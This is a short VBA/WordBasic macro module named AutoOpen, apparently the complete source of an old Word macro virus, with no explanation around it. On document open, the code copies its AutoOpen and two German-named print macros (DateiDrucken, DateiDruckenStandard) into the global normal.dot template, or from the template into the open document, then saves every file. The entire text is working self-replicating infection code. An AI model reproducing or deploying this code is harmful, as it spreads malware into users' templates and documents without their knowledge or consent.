   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Z$
   Dim Q$
   WordBasic.FileSaveAs Format:=1
    If WordBasic.CountMacros(1) <> 0 Then
    Z$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    Q$ = WordBasic.[FileName$]():
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="DateiDruckenStandard", Tab:=3
    Else
    Q$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    Z$ = WordBasic.[FileName$]():
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
    Name:="DateiDruckenStandard", Tab:=3
   End If
   WordBasic.FileSaveAll
   End Sub
